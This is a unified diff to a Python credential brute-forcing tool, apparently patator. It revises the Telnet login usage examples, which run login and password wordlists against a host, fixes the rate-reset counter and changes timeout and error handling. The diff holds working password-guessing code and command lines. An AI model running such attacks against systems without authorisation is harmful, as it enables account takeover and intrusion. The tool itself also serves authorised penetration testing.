@@ -289,16 +289,16 @@ ssh_login ... -x ignore:mesg='Authentication failed.' -x ignore,reset,retry:mesg
 
 * Brute-force authentication.
   (a) Enter login after first prompt is detected, enter password after second prompt.
-  (b) Reconnect everytime the server returns a different error message.
-  (c) Do not report these error messages.
+  (b) The regex to detect the login and password prompts.
+  (c) Reconnect when we get no login prompt back (max number of tries reached or successful login).
 ------------                    (a)
 telnet_login host=10.0.0.1 inputs='FILE0\nFILE1' 0=logins.txt 1=passwords.txt
- -x reset:fgrep!='Login incorrect' -x ignore:egrep='Login incorrect|telnet connection closed'
-    (b)                               (c)
-
-NB. If you still get errors like "telnet connection closed", this is because
-    they occur at TCP connect time, so try decreasing the number of threads,
-    the server may be enforcing a maximum number of concurrent connections.
+ prompt_re='Username:|Password:' -x reset:egrep!='% Login failed!.+Username:'
+ (b)                             (c)
+ 
+NB. If you get errors like "telnet connection closed", this is because they occur
+    at TCP connect time, so try decreasing the number of threads, the server may
+    be enforcing a maximum number of concurrent connections.
 
 }}}
 {{{ SMTP
@@ -715,7 +715,7 @@ Syntax:
 
     opt_grp = OptionGroup(parser, 'Optimization')
     opt_grp.add_option('--rate-limit', dest='rate_limit', type='float', default=0, metavar='N', help='wait N seconds between tests (default is 0)')
-    opt_grp.add_option('--rate-reset', dest='rate_reset', type='int', default=0, metavar='N', help='reset module every N tests (default is 0)')
+    opt_grp.add_option('--rate-reset', dest='rate_reset', type='int', default=0, metavar='N', help='reset module every N tests (default is 0: never reset)')
     opt_grp.add_option('--failure-delay', dest='failure_delay', type='float', default=0.5, metavar='N', help='wait N seconds after a failure (default is 0.5)')
     opt_grp.add_option('--max-retries', dest='max_retries', type='int', default=5, metavar='N', help='skip payload after N failures (default is 5) (-1 for unlimited)')
     opt_grp.add_option('-t', '--threads', dest='num_threads', type='int', default=10, metavar='N', help='number of threads (default is 10)')
@@ -1032,18 +1032,18 @@ Syntax:
           sleep(1)
 
         if self.rate_reset > 0:
-          if rate_count == self.rate_reset:
+          if rate_count >= self.rate_reset:
             logger.debug('Reset module')
             module = self.module()
             rate_count = 0
-          else:
-            rate_count += 1
 
         if self.rate_limit:
           sleep(self.rate_limit)
 
+        logger.debug('Trying: %s' % payload)
+
         try:
-          logger.debug('Trying: %s' % payload)
+          rate_count += 1
           resp = module.execute(**payload)
 
         except:
@@ -1051,6 +1051,7 @@ Syntax:
           resp = '%s, %s' % (e_type, e_value.args)
           logger.debug('except: %s' % resp)
           module = self.module()
+          rate_count = 0
           sleep(self.failure_delay)
           continue
 
@@ -1413,8 +1414,8 @@ class Telnet_login(TCP_Cache):
   '''Brute-force Telnet authentication'''
 
   usage_hints = (
-    """%prog host=10.0.0.1 inputs='FILE0\\nFILE1' 0=logins.txt 1=passwords.txt"""
-    """ -x reset:fgrep!='Login incorrect' -x ignore:egrep='Login incorrect|telnet connection closed'""",
+    """%prog host=10.0.0.1 inputs='FILE0\\nFILE1' 0=logins.txt 1=passwords.txt persistent=0"""
+    """ prompt_re='Username:|Password:' -x ignore:egrep='Login incorrect.+Username:'""",
     )
 
   available_options = (
@@ -1422,7 +1423,7 @@ class Telnet_login(TCP_Cache):
     ('port', 'ports to target [23]'),
     ('inputs', 'list of values to input'),
     ('prompt_re', 'regular expression to match prompts [\w+]'),
-    ('timeout', 'seconds to wait for prompt_re to match received data [10]'),
+    ('timeout', 'seconds to wait for prompt_re to match received data [20]'),
     )
   available_options += TCP_Cache.available_options
 
@@ -1433,20 +1434,20 @@ class Telnet_login(TCP_Cache):
     self.prompt_count = 0
     return fp, None
   
-  def execute(self, host, port=None, inputs=None, prompt_re='\w+:', timeout=10, persistent='1'):
+  def execute(self, host, port=None, inputs=None, prompt_re='\w+:', timeout='20', persistent='1'):
     fp, _ = self.get_tcp(persistent, host=host, port=port)
     trace = ''
+    timeout = int(timeout)
 
     if self.prompt_count == 0:
       _, _, raw = fp.expect([prompt_re], timeout=timeout)
-      raw += fp.read_very_eager()
       logger.debug('raw banner: %s' % repr(raw))
       trace += raw
       self.prompt_count += 1
   
     try:
       for val in inputs.split(r'\n'):
-        logger.debug('val: %s' % val)
+        logger.debug('input: %s' % val)
         cmd = val + '\n'
         fp.write(cmd)
         trace += cmd
@@ -1459,8 +1460,8 @@ class Telnet_login(TCP_Cache):
       mesg = repr(raw)[1:-1] # strip enclosing single quotes
 
     except EOFError as e:
-      logger.debug('EOFError: %s' % e)
-      mesg, = e
+      mesg = 'EOFError: %s' % e
+      logger.debug(mesg)
 
     return self.Response('0', mesg, trace)
 
